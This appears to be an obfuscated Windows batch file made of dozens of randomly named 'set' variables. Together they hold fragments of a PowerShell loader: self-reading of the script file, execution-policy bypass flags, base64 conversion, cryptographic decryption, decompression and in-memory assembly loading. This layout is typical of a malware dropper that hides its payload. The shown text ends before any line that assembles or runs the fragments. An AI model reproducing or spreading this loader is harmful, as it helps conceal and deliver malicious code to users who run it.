@echo off
set "kLwHqtGBdg=('%~f0'"
set "BzjkeJcYwS=$ANN"
set "guZFJvzMAG=BC;$"
set "aQiQPJgBie=Obje"
set "VvuJQkzktt=[Sys"
set "hegMFbavDr=.Con"
set "kjGvbfjNak= [Sy"
set "OdifZwavvz=7Yiv"
set "esQhWPNmXz=$sRg"
set "XoVdivGwUL=S46e"
set "MqbpSzSCcI=);$u"
set "pRjhlEwSYT=m.Re"
set "qYPXNqnwmO=.Len"
set "WbAruhYXUy=tem."
set "MdETkKqCeq=]::C"
set "eplXlmScRi=e = "
set "XgcJRSbNdh=v4Ir"
set "ttSDwUPaRG=ddin"
set "ujfMHpbeCF=N.Pa"
set "jRzKKyoYkp=6esa"
set "qaaZWcZxUG=Stre"
set "BOQoppUtPF=$OEs"
set "AQmkWNLlat=  $f"
set "mpCBtYIMRl=ct S"
set "bJPiCpDYsf=]::("
set "SePscussJv=.IO."
set "UsnRkEAbxP== $A"
set "yqBFuXvSeI=ddin"
set "JsXlhkRMae=q.Su"
set "eGDiIdLQKR=ck($"
set "SfrNXqXAzs=Syst"
set "YdjUhLwJUl=ress"
set "BDsxAWQICC=NNLN"
set "OyXDAwEzYQ=ewLi"
set "SMMchdyKZb=::De"
set "YjsvBRpSJh=Disp"
set "OUpTLrttJC=-1.."
set "YhTLdRVfBa=n ''"
set "CYHYeCTCUO=m.IO"
set "FNFJowIjnd=HHq "
set "rIyaAQeGkG=)($v"
set "WeSDKtyaSt=$vQa"
set "cbbbAQPaJh=em.I"
set "NwTheyXiFn=pDZz"
set "HLVBNXiRWI=-ep "
set "hcgGkohTvU=Conv"
set "zAMJUqbhXs=lBlo"
set "DJJizzOkwE==');"
set "FeyysjoxBg=ing("
set "ihoEogOKWN=d;$A"
set "niPkbCnLua=aK.D"
set "ylYBEsXMCs=sion"
set "KUmgvCqpDZ=tryP"
set "NBiFmOsrkz=y.Pa"
set "qzbuCeuNAF=ert]"
set "MlxpcdbKLR=esaB"
set "EOshVUDTBG=U, 0"
set "cDvCiUJrgp=;$QX"
set "BXZVkjqzOy=XVvb"
set "sHnSnFhNel=Rxvt"
set "lVSfoUvlaW=t Sy"
set "NCTkDmcVfu=y.Ci"
set "jpcZOfXfZd=.Sec"
set "BbLbgvnrjg=th('"
set "ghCETMxEYR=comm"
set "aetZwOTHzT=1] -"
set "gAYsBdaVdd=vert"
set "OSBuPujCls=esFX"
set "NMLvOXegPr=isfL"
set "ANlWBaxKDT=hyvE"
set "AlotwOjqGa=O.Me"
set "EIlNNbRzTt=hy.A"
set "FOZyMOLfKq=OEsK"
set "ppiLFnhBQH=.Key"
set "yiLCtLNVwH=vj0m"
set "sTsQprPiRM=UU ="
set "FyFzBNlUlr=join"
set "fgSdeJPBJk=m(, "
set "YxDjbTFzSf=e]::"
set "YGozKHAyPf=rity"
set "cXDttyssEe=$HSO"
set "mHrfikxPsf=$vQa"
set "YMovkUCFXe= if "
set "wFKBhphHNB= = $"
set "XnwDIDMJnN=UU);"
set "pznVDxzqVp=Syst"
set "EhuhekkHpb=hyvE"
set "aqaXhJlXwL=);$A"
set "NoOtrWfDTj=stem"
set "TtZTjnzvXi=join"
set "GMBLVoBSlg=);$Q"
set "XmbyNpRVrR=Secu"
set "hWrMXaCKRj=ress"
set "GCJMQhfeSD=yste"
set "FeYiksgiFn=oArr"
set "AVcphJiOtb=U = "
set "kTXeHTThGA=;$qe"
set "xvcFOhQxAe=ateD"
set "FLvASmSKXS=Comp"
set "ysfLPtuUUm=rofi"
set "bRvOvZuIWE=vtb "
set "HfbmoSvyyA=.Ass"
set "YreYjkBrWy=vQaU"
set "VuSqqZSQbh=;$HS"
set "JFVBfNIuHt=QaUU"
set "oSjfAoDUrk=Invo"
set "gVHdBTlQHS=$qeP"
set "BOSQpKPPdh=yTo("
set "VJJgewpALs=qePW"
set "QLCgOauaEB=QaUU"
set "vRGuSlLrwx=ay()"
set "CulxyisXxs=3HWs"
set "PRkGCRjALq=Ka ="
set "uiMvwZWpGT=ion."
set "DcptyjNDNL=stem"
set "unspPjtDXb=V = "
set "cJsIdpxZBV=wG);"
set "rpFmZLcuDX=736u"
set "uQQQcbcfcA=-nop"
set "OcISyWgzGO=ose("
set "YlaTdaaoKU=.Dis"
set "SizGgLEGfr=oryS"
set "SOAopkLHSX=-joi"
set "tomHSrwydT=SB.T"
set "RiNSevwFtI=Fina"
set "KImmZWYPCD=U = "
set "QduRNtvcEX=flec"
set "gwSbNWvZfg=.Cop"
set "VdWVvaKHsz=wG ="
